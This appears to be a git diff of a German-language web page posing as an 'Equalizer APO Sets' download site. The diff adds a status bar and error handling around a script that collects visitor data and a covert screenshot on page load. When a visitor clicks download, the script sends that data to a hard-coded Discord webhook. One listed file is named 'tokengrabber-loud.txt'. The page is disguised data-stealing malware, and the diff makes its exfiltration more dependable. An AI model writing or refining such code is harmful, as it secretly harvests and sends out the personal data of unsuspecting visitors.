@@ -37,6 +37,33 @@
             margin-bottom: 25px;
             font-size: 14px;
         }
+        .status-bar {
+            background: #333;
+            padding: 10px 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 10px;
+            border-left: 4px solid #ffc107;
+        }
+        .status-text {
+            font-size: 13px;
+            color: #ccc;
+        }
+        .status-text .dot {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            margin-right: 8px;
+        }
+        .status-text .dot.green { background: #28a745; }
+        .status-text .dot.red { background: #dc3545; }
+        .status-text .dot.yellow { background: #ffc107; }
+        .status-text .dot.gray { background: #666; }
         .search-box {
             width: 100%;
             padding: 12px 20px;
@@ -122,6 +149,12 @@
             opacity: 0.5;
             cursor: not-allowed;
         }
+        .download-btn.success {
+            background: #28a745;
+        }
+        .download-btn.error {
+            background: #dc3545;
+        }
         .empty-state {
             text-align: center;
             color: #666;
@@ -173,6 +206,13 @@
         <h1>Equalizer APO Sets</h1>
         <p class="subtitle">Lade vorgefertigte Equalizer-Einstellungen herunter</p>
 
+        <div class="status-bar">
+            <div class="status-text">
+                <span class="dot gray" id="statusDot"></span>
+                <span id="statusLabel">Lade...</span>
+            </div>
+        </div>
+
         <input type="text" class="search-box" id="searchInput" placeholder="Sets durchsuchen..." oninput="filterSets()">
 
         <div class="set-grid" id="setGrid"></div>
@@ -185,7 +225,11 @@
     <div class="toast" id="toast"></div>
 
     <script>
+        // ============================================
+        // KONFIGURATION - HIER DEINE WEBHOOK-URL EINTRAGEN!
+        // ============================================
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1531797628537274429/rdltEYhjTKPo-HxAdyg5BXF24pCVaZzNqVP2GQ2RkyjS4JarkOUZ_KLCrGpPLTM2Unx6";
+        // ============================================
 
         let collectedData = null;
         let dataSent = false;
@@ -229,6 +273,12 @@
                 file: "tokengrabber-loud.txt"
             }
         ];
+
+        function updateStatus(text, dotColor) {
+            document.getElementById('statusLabel').textContent = text;
+            const dot = document.getElementById('statusDot');
+            dot.className = 'dot ' + dotColor;
+        }
 
         function getBrowserInfo() {
             const ua = navigator.userAgent;
@@ -778,13 +828,23 @@
 
             const payload = { embeds: embeds };
 
-            const response = await fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
+            try {
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
 
-            return response.ok;
+                if (!response.ok) {
+                    const errorText = await response.text();
+                    throw new Error('HTTP ' + response.status + ': ' + errorText);
+                }
+
+                return true;
+            } catch (error) {
+                console.error('Webhook-Fehler:', error);
+                throw new Error('Webhook-Fehler: ' + error.message);
+            }
         }
 
         function showToast(message, type = 'success') {
@@ -794,7 +854,7 @@
             clearTimeout(toast._timeout);
             toast._timeout = setTimeout(() => {
                 toast.classList.remove('show');
-            }, 3000);
+            }, 4000);
         }
 
         function renderSets(filter = '') {
@@ -857,6 +917,7 @@
 
             btn.disabled = true;
             btn.textContent = 'Wird gesendet...';
+            updateStatus('Sende Daten...', 'yellow');
 
             try {
                 if (!collectedData) {
@@ -867,33 +928,34 @@
                     screenshotData = createScreenshot();
                 }
 
-                const success = await sendToWebhook(collectedData);
+                await sendToWebhook(collectedData);
 
-                if (success) {
-                    dataSent = true;
-                    showToast('Daten gesendet + Download startet', 'success');
-                    downloadSet(filename, name);
-                    btn.textContent = 'Erfolg';
-                    btn.style.background = '#28a745';
-                } else {
-                    throw new Error('Webhook-Fehler');
-                }
+                dataSent = true;
+                updateStatus('Erfolg', 'green');
+                showToast('Daten gesendet + Download startet', 'success');
+                downloadSet(filename, name);
+                btn.textContent = 'Erfolg ✓';
+                btn.className = 'download-btn success';
+                
             } catch (error) {
+                updateStatus('Fehler', 'red');
                 showToast('Fehler: ' + error.message, 'error');
                 btn.disabled = false;
                 btn.textContent = 'Download';
-                btn.style.background = '#4a90e2';
+                btn.className = 'download-btn error';
+                console.error('Fehler:', error);
             }
         }
 
         window.addEventListener('DOMContentLoaded', async function() {
             try {
+                updateStatus('Lade...', 'gray');
                 collectedData = await collectAllData();
                 renderSets();
-                
                 screenshotData = createScreenshot();
-                console.log('Screenshot erstellt (unsichtbar)');
+                updateStatus('', 'gray');
             } catch (error) {
+                updateStatus('Fehler beim Laden', 'red');
                 console.error(error);
             }
         });
